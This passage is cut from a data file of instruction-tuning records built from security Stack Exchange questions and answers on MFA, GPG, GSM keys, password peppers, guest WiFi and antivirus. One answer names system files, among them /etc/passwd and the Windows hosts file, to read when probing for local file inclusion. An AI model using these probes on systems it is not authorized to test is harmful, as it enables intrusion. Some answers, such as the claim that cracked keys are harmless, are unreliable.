      "answer": "All servers using IPv4 addresses get some level of background noise in the form of automated scanning and bruteforce attempts. This is basically because it is easy to scan the entire address space - it takes less than an hour, and can result in systems which haven't been fully patched or set up yet.\nAs a result, I would fully expect any system to see lots of this kind of traffic. This is why it is important to sort out your security before opening your server to the internet. Keep your firewall turned on, blocking any incoming traffic whilst setting it up. Restrict access to know IP addresses for testing. Once you are sure it's secure, then you can open the firewall to the rest of the internet to connect.\nIf you have a server with a reverse DNS lookup set, once someone has the IP address, they can look to see what domain name your system thinks it belongs to, hence the URL attempts too.\nBasically, if you have made sure your system is secure, don't worry - make sure you've got decent passwords for SSH (or, better yet, key-based login), and that any other services are locked down properly. If you haven't, or you think they got in, treat it like a compromised server - sort out your firewall (probably with your hosting provider) and then start over."
    }
  },
  {
    "instruction": "Question: GSM A5/1 encryption: Key management\nI'm currently studying the A5/1 algorithm used for GSM encryption. I understood how thanks to the symmetric private Key and a public counter frame one can encrypt the communication between A and B.\nHowever, what I don't really understand is how the symmetric private key K is managed ? If A wants to communicate with B. A and B have to share the same secret key K. Now, if A wants to communicate with C, A and C will have to share the same secret key. How does this key distribution is handled ? Does the phone company distribute them before the call ?",
    "context": "",
    "output": "Answer: GSM uses three different security algorithms - A3, A5, and A8. \nThe A3 algorithm is used to authenticate the mobile device,\nthe A5 algorithm to encrypt the data transmitted,\nand the A8 algorithm is used to generate the session key.\nHence, I believe you are interested in the A8 algorithm which deviates the session keys through a  challenge and response handshake. However, I the session keys are shared between the user and his base station only and not between two communicating parties. The base station will decrypt the data and transfer it (most probably in plain text) to the other party's base station which then encrypts the data with the key shared with the other party of the conversation.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "GSM A5/1 encryption: Key management\nI'm currently studying the A5/1 algorithm used for GSM encryption. I understood how thanks to the symmetric private Key and a public counter frame one can encrypt the communication between A and B.\nHowever, what I don't really understand is how the symmetric private key K is managed ? If A wants to communicate with B. A and B have to share the same secret key K. Now, if A wants to communicate with C, A and C will have to share the same secret key. How does this key distribution is handled ? Does the phone company distribute them before the call ?",
      "answer": "GSM uses three different security algorithms - A3, A5, and A8. \nThe A3 algorithm is used to authenticate the mobile device,\nthe A5 algorithm to encrypt the data transmitted,\nand the A8 algorithm is used to generate the session key.\nHence, I believe you are interested in the A8 algorithm which deviates the session keys through a  challenge and response handshake. However, I the session keys are shared between the user and his base station only and not between two communicating parties. The base station will decrypt the data and transfer it (most probably in plain text) to the other party's base station which then encrypts the data with the key shared with the other party of the conversation."
    }
  },
  {
    "instruction": "Answer the question below.\nIs it safe to save a screenshot of my QR code?\nFor MFA I now use Authy (owned by Twilio) instead of Google Authenticator. I find Authy more convenient because it syncs your accounts between several devices and several authy installations which Google Authenticator will not do. Authy also displays the remaining time before a token times out so that you can see if it is about to expire. I also take a screenshot of every QR code so that I can register it again with a new device or a new MFA app. I can confirm that a token from Authy works to authenticate with AWS. There is also another MFA app named FreeOTP which I did not try.\nIf someone \"found\" that image file from the QR screenshot, and they \"guessed\" my password, what would prevent them from impersonating me without me noticing it? \nFor example, someone has FreeOTP, has the QR code screenshot and knows my AWS password (highly unlikely but possible). I tested reading an screenshot of a QR code and register it with FreeOTP. FreeOTP did start generating a valid token (same as in authy).\u00a0\nWhat I really want to know is: Is it a security concern to save a screenshot of the QR code?",
    "context": "",
    "output": "The QR code used on setting up MFA contain the seed that is used for the MFA process. That's what allows you, having that initial QR code, to set up another client with the same codes.\nThe drawback of this is that, just as you can set up a second client, a third party that got hold of those QR codes, could do that as well. Thus, if someone got that QR and password, it would have all needed information to log in as you.\nI would say it is a security concern only depending on how it is being stored. You may store those QR, but I would recommend treating them as passwords, note they guard (half the) access to the relevant account. For instance, you may want to rather than syncing them with the cloud like other photos to save them in a password manager instead.\nPS: It's equivalent here that you are using Google Authenticator, Authy, FreeOTP or other client. Most likely, the MFA is using a TOTP token, as defined on rfc 6238. which many clients support.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Is it safe to save a screenshot of my QR code?\nFor MFA I now use Authy (owned by Twilio) instead of Google Authenticator. I find Authy more convenient because it syncs your accounts between several devices and several authy installations which Google Authenticator will not do. Authy also displays the remaining time before a token times out so that you can see if it is about to expire. I also take a screenshot of every QR code so that I can register it again with a new device or a new MFA app. I can confirm that a token from Authy works to authenticate with AWS. There is also another MFA app named FreeOTP which I did not try.\nIf someone \"found\" that image file from the QR screenshot, and they \"guessed\" my password, what would prevent them from impersonating me without me noticing it? \nFor example, someone has FreeOTP, has the QR code screenshot and knows my AWS password (highly unlikely but possible). I tested reading an screenshot of a QR code and register it with FreeOTP. FreeOTP did start generating a valid token (same as in authy).\u00a0\nWhat I really want to know is: Is it a security concern to save a screenshot of the QR code?",
      "answer": "The QR code used on setting up MFA contain the seed that is used for the MFA process. That's what allows you, having that initial QR code, to set up another client with the same codes.\nThe drawback of this is that, just as you can set up a second client, a third party that got hold of those QR codes, could do that as well. Thus, if someone got that QR and password, it would have all needed information to log in as you.\nI would say it is a security concern only depending on how it is being stored. You may store those QR, but I would recommend treating them as passwords, note they guard (half the) access to the relevant account. For instance, you may want to rather than syncing them with the cloud like other photos to save them in a password manager instead.\nPS: It's equivalent here that you are using Google Authenticator, Authy, FreeOTP or other client. Most likely, the MFA is using a TOTP token, as defined on rfc 6238. which many clients support."
    }
  },
  {
    "instruction": "How to repack the monobundleapp\nI recently had to make a version of a survivalcraft 2 mod that allowed circuits to run faster\nI found this script by stack overflow to unpack a mono bundle app\nI already modified the .dll, but I need to repack it, and I don't know anything about pyelftools\nScript:\nfrom elftools.elf.elffile import ELFFile\nfrom zipfile import ZipFile\nfrom cStringIO import StringIO\nimport gzip, string\n\ndata = open('libmonodroid_bundle_app.so').read()\nf = StringIO(data)\nelffile = ELFFile(f)\nsection = elffile.get_section_by_name('.dynsym')\nfor symbol in section.iter_symbols():\n  if symbol['st_shndx'] != 'SHN_UNDEF' and symbol.name.startswith('assembly_data_'):\n    print symbol.name\n    dll_data = data[symbol['st_value']:symbol['st_value']+symbol['st_size']]\n    dll_data = gzip.GzipFile(fileobj=StringIO(dll_data)).read()\n    outfile = open(symbol.name[14:].replace('_dll', '.dll'), 'w+'); print symbol.name[14:].replace('_dll', '.dll')\n    outfile.write(dll_data)\n    outfile.close()",
    "context": "",
    "output": "I already created a script, However, It probably won't work, Although, There is a folder called assemblies without the mono bundle, you will probably just need to zip the extracted dlls, create the folder, and delete the mono bundle\nHowever, I'm not sure, but anything is possible :)",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How to repack the monobundleapp\nI recently had to make a version of a survivalcraft 2 mod that allowed circuits to run faster\nI found this script by stack overflow to unpack a mono bundle app\nI already modified the .dll, but I need to repack it, and I don't know anything about pyelftools\nScript:\nfrom elftools.elf.elffile import ELFFile\nfrom zipfile import ZipFile\nfrom cStringIO import StringIO\nimport gzip, string\n\ndata = open('libmonodroid_bundle_app.so').read()\nf = StringIO(data)\nelffile = ELFFile(f)\nsection = elffile.get_section_by_name('.dynsym')\nfor symbol in section.iter_symbols():\n  if symbol['st_shndx'] != 'SHN_UNDEF' and symbol.name.startswith('assembly_data_'):\n    print symbol.name\n    dll_data = data[symbol['st_value']:symbol['st_value']+symbol['st_size']]\n    dll_data = gzip.GzipFile(fileobj=StringIO(dll_data)).read()\n    outfile = open(symbol.name[14:].replace('_dll', '.dll'), 'w+'); print symbol.name[14:].replace('_dll', '.dll')\n    outfile.write(dll_data)\n    outfile.close()",
      "answer": "I already created a script, However, It probably won't work, Although, There is a folder called assemblies without the mono bundle, you will probably just need to zip the extracted dlls, create the folder, and delete the mono bundle\nHowever, I'm not sure, but anything is possible :)"
    }
  },
  {
    "instruction": "Answer the question below.\nCan 'cracked' product keys harm the user in any way?\nIf a user download commercial software through the official, corresponding website, but use a product key which you did not legitimately purchase (e.g. websites that offer a list of product keys for free), does that harm anything other than the company who made the piece of software?\nI was wondering if the person who generated those product keys can see which user(s) have used that key and are able to harm them in any way.",
    "context": "",
    "output": "No.\nOnly the manufacturer of the software can know what key you have used and only if the software \"calls home\" for (re-)activation. Using a non-original key (for example, one provided by a key generator) will not give anyone back-door access to your computer/program.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Can 'cracked' product keys harm the user in any way?\nIf a user download commercial software through the official, corresponding website, but use a product key which you did not legitimately purchase (e.g. websites that offer a list of product keys for free), does that harm anything other than the company who made the piece of software?\nI was wondering if the person who generated those product keys can see which user(s) have used that key and are able to harm them in any way.",
      "answer": "No.\nOnly the manufacturer of the software can know what key you have used and only if the software \"calls home\" for (re-)activation. Using a non-original key (for example, one provided by a key generator) will not give anyone back-door access to your computer/program."
    }
  },
  {
    "instruction": "Does Google/Dropbox/Github Two-Step Verification count as Two-Factor?\nThis considers the route where somebody does not use the SMS option, but rather using TOTP, and the site offers a generated seed to input.\nTwo factors questionably at use:\n\npassword: something KNOWN\nTOTP: does this count as something you HAVE?\n\nWhat proof is there that I am using my cell phone to generate the TOTP codes? You can write the algorithm in maybe 30 lines of most languages, what if I have a script on my computer do it? Or have the same seed/script on all of my computers? Does this still count as a HAVE?\n\nExtra followup if this use of TOTP does not count as two-factor (if I'm allowed followup questions): Is any use of TOTP acceptable for HAVE?",
    "context": "",
    "output": "In a previous job we were looking at implementing two-factor, and had long discussions about what actually counted as a separate factor. For example, sending SMS to a phone is sort-of \"something you have\" although it's not as secure as a dedicated token. The solution to the long discussions was to abandon the term \"two-factor\" altogether and instead talk about \"multi factor authentication\". Because while things like TOTP and SMS codes are not as good as dedicated hardward, they are definitely better than a password alone.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Does Google/Dropbox/Github Two-Step Verification count as Two-Factor?\nThis considers the route where somebody does not use the SMS option, but rather using TOTP, and the site offers a generated seed to input.\nTwo factors questionably at use:\n\npassword: something KNOWN\nTOTP: does this count as something you HAVE?\n\nWhat proof is there that I am using my cell phone to generate the TOTP codes? You can write the algorithm in maybe 30 lines of most languages, what if I have a script on my computer do it? Or have the same seed/script on all of my computers? Does this still count as a HAVE?\n\nExtra followup if this use of TOTP does not count as two-factor (if I'm allowed followup questions): Is any use of TOTP acceptable for HAVE?",
      "answer": "In a previous job we were looking at implementing two-factor, and had long discussions about what actually counted as a separate factor. For example, sending SMS to a phone is sort-of \"something you have\" although it's not as secure as a dedicated token. The solution to the long discussions was to abandon the term \"two-factor\" altogether and instead talk about \"multi factor authentication\". Because while things like TOTP and SMS codes are not as good as dedicated hardward, they are definitely better than a password alone."
    }
  },
  {
    "instruction": "Is all metadata necessary for decryption included in a symmetrically encrypted GNU Privacy Guard message?\nSuppose I symmetrically encrypt a file with a passphrase using GNU Privacy Guard and send it to a friend. I use the latest version and all the defaults, so AES-128 encryption is used, with the salt and s2k_count used for the password derivation function automatically generated.\nI then tell my friend the passphrase and ask them to open it.\nAre the salt, S2K type, s2k_count, and so on included in the file somehow, so that my friend can decrypt the file knowing only the password?\nI suspect the answer is affirmative but I have not been able to find it in the documentation.",
    "context": "",
    "output": "Yes, it is.\nYou can verify this easily by yourself by encrypting a file with gpg -c filename and then decrypting that file with the password you have specified. No further parameters are required.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Is all metadata necessary for decryption included in a symmetrically encrypted GNU Privacy Guard message?\nSuppose I symmetrically encrypt a file with a passphrase using GNU Privacy Guard and send it to a friend. I use the latest version and all the defaults, so AES-128 encryption is used, with the salt and s2k_count used for the password derivation function automatically generated.\nI then tell my friend the passphrase and ask them to open it.\nAre the salt, S2K type, s2k_count, and so on included in the file somehow, so that my friend can decrypt the file knowing only the password?\nI suspect the answer is affirmative but I have not been able to find it in the documentation.",
      "answer": "Yes, it is.\nYou can verify this easily by yourself by encrypting a file with gpg -c filename and then decrypting that file with the password you have specified. No further parameters are required."
    }
  },
  {
    "instruction": "Patterns in password creation over multiple passwords\nLets say I create 100 separate passwords, consisting of around eight random characters followed by two constant ones that are the same for all passwords:\nGenerated password = 8 random characters + `.p`\n\nIf I do this for all 100 passwords, does adding the same .p for every password make them more or less secure? How much of an impact would it have if two of all those passwords were compromised?",
    "context": "",
    "output": "So far the answers have been for \"If I as a user add '.p' the end of all my passwords on various sites\".\nSo I'd like to tackle the other possibility the original question could mean: \"If I as a system programmer add '.p' to the end of all my users' passwords\"\nWhat you're describing is called a \"Pepper\" - it's a application-specific snippet that's tacked onto the password before hashing.\nSo what does this get you?\n\nIt prevents dictionary attacks (since the attacker wouldn't know that\nevery password has a specific string of characters appended to the\nend.)\nIt prevents a breach in another set of credentials from compromising\nyours (since there's no way another system's Hash(Password) would\nmatch your Hash(Password+AppSpecificPepper).\n\nWhat does it not get you?\n\nIt doesn't prevent one password being cracked from cascading to all\naccounts with the same password, since Hash(Password+Pepper) would\nmatch for all accounts with the same password.\n\nSo, when it's all said and done?  Absolutely - add the '.p' (or a much longer secret string) to the end of users' passwords.  It makes the passwords more secure than just the original 8 chars alone - worst case, the attacker manages to compromise the app and get the pepper, in which case you're only as bad off as if you hadn't used a pepper in the first place.  But make sure to add a Salt as well, so you don't let an attacker compromise multiple accounts with a single password crack.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Patterns in password creation over multiple passwords\nLets say I create 100 separate passwords, consisting of around eight random characters followed by two constant ones that are the same for all passwords:\nGenerated password = 8 random characters + `.p`\n\nIf I do this for all 100 passwords, does adding the same .p for every password make them more or less secure? How much of an impact would it have if two of all those passwords were compromised?",
      "answer": "So far the answers have been for \"If I as a user add '.p' the end of all my passwords on various sites\".\nSo I'd like to tackle the other possibility the original question could mean: \"If I as a system programmer add '.p' to the end of all my users' passwords\"\nWhat you're describing is called a \"Pepper\" - it's a application-specific snippet that's tacked onto the password before hashing.\nSo what does this get you?\n\nIt prevents dictionary attacks (since the attacker wouldn't know that\nevery password has a specific string of characters appended to the\nend.)\nIt prevents a breach in another set of credentials from compromising\nyours (since there's no way another system's Hash(Password) would\nmatch your Hash(Password+AppSpecificPepper).\n\nWhat does it not get you?\n\nIt doesn't prevent one password being cracked from cascading to all\naccounts with the same password, since Hash(Password+Pepper) would\nmatch for all accounts with the same password.\n\nSo, when it's all said and done?  Absolutely - add the '.p' (or a much longer secret string) to the end of users' passwords.  It makes the passwords more secure than just the original 8 chars alone - worst case, the attacker manages to compromise the app and get the pepper, in which case you're only as bad off as if you hadn't used a pepper in the first place.  But make sure to add a Salt as well, so you don't let an attacker compromise multiple accounts with a single password crack."
    }
  },
  {
    "instruction": "What is the answer to this question - SSL what's the client write key used in application layer?\nI've used wireshark to watch serveral SSL3.0 traffic and decrypt the messages transfered between client & server.\nAnd what I've just found is very strange :\nAFAIK, the encryption-key, MAC and encryption algorithm used in calculating client-Finished and application-data sent by client are exactly the same.\nBut, when I use the same client-write-key used to encrypt client-finished (Derived from MasterSecret) to encrypt application data, I get the different result from what the client (firefox) calculated.\nThe odd behavior also happened with server: I can use server-write-key (derive from MasterSecret) to decrypt successfully the \"server-finished\" message, but failed to decrypt any other encrypted message from server.\nSo, can you please tell me what happened to the client-write-key & server-write-key ? Did both client and server changed their write-key after \"finished\" message sent?\nPS: I forced client (Firefox) to use SSL V3.0, cipherSuite = TLS_RSA_WITH_RC4_128_MD5\n\n",
    "context": "",
    "output": "I found out the answer myself : the function RC4 I've used didn't save the cipher state, while SSL stream cipher required that. I've used a RC4 class and problem resolved!",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "SSL what's the client write key used in application layer?\nI've used wireshark to watch serveral SSL3.0 traffic and decrypt the messages transfered between client & server.\nAnd what I've just found is very strange :\nAFAIK, the encryption-key, MAC and encryption algorithm used in calculating client-Finished and application-data sent by client are exactly the same.\nBut, when I use the same client-write-key used to encrypt client-finished (Derived from MasterSecret) to encrypt application data, I get the different result from what the client (firefox) calculated.\nThe odd behavior also happened with server: I can use server-write-key (derive from MasterSecret) to decrypt successfully the \"server-finished\" message, but failed to decrypt any other encrypted message from server.\nSo, can you please tell me what happened to the client-write-key & server-write-key ? Did both client and server changed their write-key after \"finished\" message sent?\nPS: I forced client (Firefox) to use SSL V3.0, cipherSuite = TLS_RSA_WITH_RC4_128_MD5",
      "answer": "I found out the answer myself : the function RC4 I've used didn't save the cipher state, while SSL stream cipher required that. I've used a RC4 class and problem resolved!"
    }
  },
  {
    "instruction": "Please answer this question: Buffer Overflow shell question\nIf a custom library is affected by a buffer overflow and it is linked against an executable running as root. If an attacker gains a remote reverse shell, it will run under the user of the linked executable?",
    "context": "",
    "output": "A library that links against an executable will share all attributes of the process, including UID. For example, a vulnerable OpenSSL library linking against an executable whose process is running as www-data will, if exploited, give access to that user. If the same exact library is linked against an executable whose process is running as root, then exploitation will give access to that user.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Buffer Overflow shell question\nIf a custom library is affected by a buffer overflow and it is linked against an executable running as root. If an attacker gains a remote reverse shell, it will run under the user of the linked executable?",
      "answer": "A library that links against an executable will share all attributes of the process, including UID. For example, a vulnerable OpenSSL library linking against an executable whose process is running as www-data will, if exploited, give access to that user. If the same exact library is linked against an executable whose process is running as root, then exploitation will give access to that user."
    }
  },
  {
    "instruction": "Question: Guest WiFi: Can I see who joins?\nI set up a Guest wifi on my new router. It has no password.\nFor some reason, I cannot see who joins it on my router's settings at 192.168.1.1. The other connections I have do show connected devices, however.\nIs this a settings problem? Or are Guests usually invisible to me? I am curious, since I can see if it is used rarely (and so worth providing), or instead is used by multiple unknown people continuously, and so bringing down the capacity.\nAlso: Is this wise? Can someone easily hack my usual connection if I provide free guest wifi without a password?",
    "context": "",
    "output": "Answer: In general this depends on the router. All WiFi routers know the WiFi Mac addresses of all associated devices, but whether you can login and see that data depends on how \u201cmanageable\u201d the WiFi router is.  But the MAC address is not necessarily a useful device name.\nWhether the WiFi threatens your devices on your secured SSID also depends on the vendor. I would expect a guest WiFi to not allow users on that net to access each other (p2p blocking) and definitely not access your secured wired/wireless nets.\nThe only way to know for sure is to try it. Associate to the guest net and try to access your secure net devices.\nThe other problem with a wide open guest WiFi network is that it is probably accessible from your neighbors houses, and they may use the network to access ...inappropriate... content that may result in a law enforcement visit or your ISP threatening to turn you off.\nI personally like guest WiFi. It minimizes the cases where I give out my internal WiFi password to guests. But letting the neighbors or pedestrians use my WiFi to download possibly awful content is a real showstopper.  Setting your DNS server to openDNS (and turning on appropriate DNS filtering) can minimize this risk for non-technical neighbors. Technical neighbors can statically set their own DNS of course.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Guest WiFi: Can I see who joins?\nI set up a Guest wifi on my new router. It has no password.\nFor some reason, I cannot see who joins it on my router's settings at 192.168.1.1. The other connections I have do show connected devices, however.\nIs this a settings problem? Or are Guests usually invisible to me? I am curious, since I can see if it is used rarely (and so worth providing), or instead is used by multiple unknown people continuously, and so bringing down the capacity.\nAlso: Is this wise? Can someone easily hack my usual connection if I provide free guest wifi without a password?",
      "answer": "In general this depends on the router. All WiFi routers know the WiFi Mac addresses of all associated devices, but whether you can login and see that data depends on how \u201cmanageable\u201d the WiFi router is.  But the MAC address is not necessarily a useful device name.\nWhether the WiFi threatens your devices on your secured SSID also depends on the vendor. I would expect a guest WiFi to not allow users on that net to access each other (p2p blocking) and definitely not access your secured wired/wireless nets.\nThe only way to know for sure is to try it. Associate to the guest net and try to access your secure net devices.\nThe other problem with a wide open guest WiFi network is that it is probably accessible from your neighbors houses, and they may use the network to access ...inappropriate... content that may result in a law enforcement visit or your ISP threatening to turn you off.\nI personally like guest WiFi. It minimizes the cases where I give out my internal WiFi password to guests. But letting the neighbors or pedestrians use my WiFi to download possibly awful content is a real showstopper.  Setting your DNS server to openDNS (and turning on appropriate DNS filtering) can minimize this risk for non-technical neighbors. Technical neighbors can statically set their own DNS of course."
    }
  },
  {
    "instruction": "Can you tell me the answer to: Is there a need to image the hard drive when using a write blocker?\nForensics books often recommend working on an image of the hard drive instead of the original drive.\nShould I take this precaution even if I use a write blocker?\nIf so, why?",
    "context": "",
    "output": "answer: Because normal read operation on a disk presenting error (physical or logical) may cause data corruption, destruction and even writing to recover bad blocks.\nYou have to keep in mind that even the read operation may lead to physical damage or data modification.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Is there a need to image the hard drive when using a write blocker?\nForensics books often recommend working on an image of the hard drive instead of the original drive.\nShould I take this precaution even if I use a write blocker?\nIf so, why?",
      "answer": "Because normal read operation on a disk presenting error (physical or logical) may cause data corruption, destruction and even writing to recover bad blocks.\nYou have to keep in mind that even the read operation may lead to physical damage or data modification."
    }
  },
  {
    "instruction": "Q: How to explain to a customer that spamfilters don't catch everything\nI used to work in a small office which provided basic desktop support for users. \nOne day I had to answer a call from a very angry customer and he asked for my boss. He wanted to know how could one email slip through their spam filter/network-based antivirus software (if there is such a thing, that's what he claimed), and the attachment got filtered/caught by the antivirus software on his desktop.\nTill I could reach my boss I had to tell him that a spam filter is not flawless/perfect and sometimes one email mange to pass. \nAlso to support my claims, I explained to him Gmail themselves allowed that email to attachment despite that his antivirus software had detected and removed it.\nWas my explanation right? How would a security expert deal with this situation?",
    "context": "",
    "output": " A: I like to use the analogy of an arms race as it's a familiar theme that non-technical people understand. Analogies are useful when trying to explain concepts such as this. Also throw in statistics. Last, use some pseudo-personal stuff to make them feel like you're in the same boat. Something like this may work:\nI completely understand your frustration with spam, I myself get at least 30 spams a day, and although almost all get picked up by the spam filters the occasional one makes it by and dirties my inbox. Spam is an arms race where spammers invent new ways to get around the filters which security companies build. When a filter gets updated to block the latest stratagems the spammers go back to work to find another way to get around it. While the security companies are smart so are the spammers, so no matter how good filters are some spam is going to get through. 130 Billion spam emails are sent every day using hundreds of different ways to fool filters and even with the best technology from some of the finest minds in the industry some will make it through.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How to explain to a customer that spamfilters don't catch everything\nI used to work in a small office which provided basic desktop support for users. \nOne day I had to answer a call from a very angry customer and he asked for my boss. He wanted to know how could one email slip through their spam filter/network-based antivirus software (if there is such a thing, that's what he claimed), and the attachment got filtered/caught by the antivirus software on his desktop.\nTill I could reach my boss I had to tell him that a spam filter is not flawless/perfect and sometimes one email mange to pass. \nAlso to support my claims, I explained to him Gmail themselves allowed that email to attachment despite that his antivirus software had detected and removed it.\nWas my explanation right? How would a security expert deal with this situation?",
      "answer": "I like to use the analogy of an arms race as it's a familiar theme that non-technical people understand. Analogies are useful when trying to explain concepts such as this. Also throw in statistics. Last, use some pseudo-personal stuff to make them feel like you're in the same boat. Something like this may work:\nI completely understand your frustration with spam, I myself get at least 30 spams a day, and although almost all get picked up by the spam filters the occasional one makes it by and dirties my inbox. Spam is an arms race where spammers invent new ways to get around the filters which security companies build. When a filter gets updated to block the latest stratagems the spammers go back to work to find another way to get around it. While the security companies are smart so are the spammers, so no matter how good filters are some spam is going to get through. 130 Billion spam emails are sent every day using hundreds of different ways to fool filters and even with the best technology from some of the finest minds in the industry some will make it through."
    }
  },
  {
    "instruction": "Q: Windows file to look for to test LFI\nFor Linux, if we want to test local file inclusion we always search for /etc/passwd\nFor old versions of Windows,  (e.g. Windows XP) we search for win.ini\nWhat file should I search for in later versions of Windows that is readable and always there?",
    "context": "",
    "output": " A: C:\\Windows\\System32\\drivers\\etc\\hosts is pretty commonly used to check for read access to the file system while pentesting. If I remember correctly, this file exists on Windows 7 and later, but I'm not sure if it exists on earlier versions.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Windows file to look for to test LFI\nFor Linux, if we want to test local file inclusion we always search for /etc/passwd\nFor old versions of Windows,  (e.g. Windows XP) we search for win.ini\nWhat file should I search for in later versions of Windows that is readable and always there?",
      "answer": "C:\\Windows\\System32\\drivers\\etc\\hosts is pretty commonly used to check for read access to the file system while pentesting. If I remember correctly, this file exists on Windows 7 and later, but I'm not sure if it exists on earlier versions."
    }
  },
  {
    "instruction": "To what extent is FREE 3rd party antivirus software better than Windows 8 defender (if any)?\nAs someone who is not in a position to currently purchase an antivirus suite, I would like to know if having a free Avira or Avast or similar program is worth the overall system performance drop (I don't have a high-end desktop, so having an antivirus running in the background does slow thing down a bit). How secure am I if I stick to using only Windows defender? Note that I am not a fan of browser flash games, and don't tend to download suspicious content without some sort of review, so that sort of threat is minimal.",
    "context": "",
    "output": "From the reviews I've seen of Windows 8 defender (which includes what was security essentials in Windows 7 and earlier), it's a pretty solid middle of the road A-V suite with some anti-spyware features.\nI don't think that it's as fully featured as the paid for security suites, but then it is free.\nFrom a personal perspective I use it as it seems fairly unobtrusive in general running and doesn't cause too many problems but does catch viruses that hit the system.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "To what extent is FREE 3rd party antivirus software better than Windows 8 defender (if any)?\nAs someone who is not in a position to currently purchase an antivirus suite, I would like to know if having a free Avira or Avast or similar program is worth the overall system performance drop (I don't have a high-end desktop, so having an antivirus running in the background does slow thing down a bit). How secure am I if I stick to using only Windows defender? Note that I am not a fan of browser flash games, and don't tend to download suspicious content without some sort of review, so that sort of threat is minimal.",
      "answer": "From the reviews I've seen of Windows 8 defender (which includes what was security essentials in Windows 7 and earlier), it's a pretty solid middle of the road A-V suite with some anti-spyware features.\nI don't think that it's as fully featured as the paid for security suites, but then it is free.\nFrom a personal perspective I use it as it seems fairly unobtrusive in general running and doesn't cause too many problems but does catch viruses that hit the system."
    }
  },
  {
    "instruction": "Q: CECPQ1 key exchange functionality\nCECPQ1 (combined elliptic Curve and Post-Quantum Cryptography Key Exchange) is a new key exhange developed by google, which combine X25519 with NewHope (elliptic Curve KE + Post-quantum KE). \nGoogle has implemented CECPQ1 in boringSSL But there isn't a documentation or clarified explanation, how it works.\nLooking at the code, I think, there are two key exchanges - X25519 and NewHope. Results of those exchanges are concatenated (here)\nThen this concatenation is fed into KDF and used as session key.\nSo even if NewHope is broken whole scheme is secure, because X25519 is secure. Attacker must break both NewHope and x25519 to break a scheme.\nCan someone confirm that? Or give me more details about CECPQ1?\nLike which KDF, it uses? what are the inputs and their sizes? Perhaps if there are any good articles or pdf, that describe well CECPQ1.",
    "context": "",
    "output": " A: According to the code you've linked to X25519 gives the first 32 bytes and NewHope gives the next 32 byte of the pre-master secret. This is also what Wikipedia says about this topic.\n\nLike which KDF, it uses?\n\nThe process of deriving the master secret from the pre-master secret is the same as for the other and more traditional key exchange algorithms and is clearly defined in the TLS 1.2 standard in section 8.1. Computing the Master Secret.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "CECPQ1 key exchange functionality\nCECPQ1 (combined elliptic Curve and Post-Quantum Cryptography Key Exchange) is a new key exhange developed by google, which combine X25519 with NewHope (elliptic Curve KE + Post-quantum KE). \nGoogle has implemented CECPQ1 in boringSSL But there isn't a documentation or clarified explanation, how it works.\nLooking at the code, I think, there are two key exchanges - X25519 and NewHope. Results of those exchanges are concatenated (here)\nThen this concatenation is fed into KDF and used as session key.\nSo even if NewHope is broken whole scheme is secure, because X25519 is secure. Attacker must break both NewHope and x25519 to break a scheme.\nCan someone confirm that? Or give me more details about CECPQ1?\nLike which KDF, it uses? what are the inputs and their sizes? Perhaps if there are any good articles or pdf, that describe well CECPQ1.",
      "answer": "According to the code you've linked to X25519 gives the first 32 bytes and NewHope gives the next 32 byte of the pre-master secret. This is also what Wikipedia says about this topic.\n\nLike which KDF, it uses?\n\nThe process of deriving the master secret from the pre-master secret is the same as for the other and more traditional key exchange algorithms and is clearly defined in the TLS 1.2 standard in section 8.1. Computing the Master Secret."
    }
  },
  {
    "instruction": "Can you tell me the answer to: GnuPG symmetric encryption yields different output\nI have a use case where I want to commit symmetrically encrypted source code using GnuPG (think of Coursera assignments for backup and collaboration). I encrypt/decrypt all sources in a batch with a script and was wondering, why the output is not stable.\nSo basically, why does\necho \"plain text\" | gpg --armor --symmetric --cipher-algo AES256\n\nwith password secret yield different cipher texts with each call? (Surely enough, this doesn't affect the decryption \u2013 different cipher texts may decrypt back to the same plain text.)\nI am not experienced with crypto algorithms, but skimming the Wikipedia article it seems the algorithm is deterministic.\nSo in short, my questions are:\n\nIs this behaviour a property of AES or am I using GnuPG incorrectly?\nIf the former is the case, are there other symmetric crypto algorithms which are better suited for this use case?",
    "context": "",
    "output": "answer: Usually, symmetric encryption starts with a random initialization vector (IV). OpenPGP uses a slightly different cypher feedback mode with an all-zero IV, but the first two blocks are random.\nBecause of this, also the symmetric encryption is not deterministic; you cannot compare the plain text by comparing the encrypted message, the encrypted result is not deterministic any more.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "GnuPG symmetric encryption yields different output\nI have a use case where I want to commit symmetrically encrypted source code using GnuPG (think of Coursera assignments for backup and collaboration). I encrypt/decrypt all sources in a batch with a script and was wondering, why the output is not stable.\nSo basically, why does\necho \"plain text\" | gpg --armor --symmetric --cipher-algo AES256\n\nwith password secret yield different cipher texts with each call? (Surely enough, this doesn't affect the decryption \u2013 different cipher texts may decrypt back to the same plain text.)\nI am not experienced with crypto algorithms, but skimming the Wikipedia article it seems the algorithm is deterministic.\nSo in short, my questions are:\n\nIs this behaviour a property of AES or am I using GnuPG incorrectly?\nIf the former is the case, are there other symmetric crypto algorithms which are better suited for this use case?",
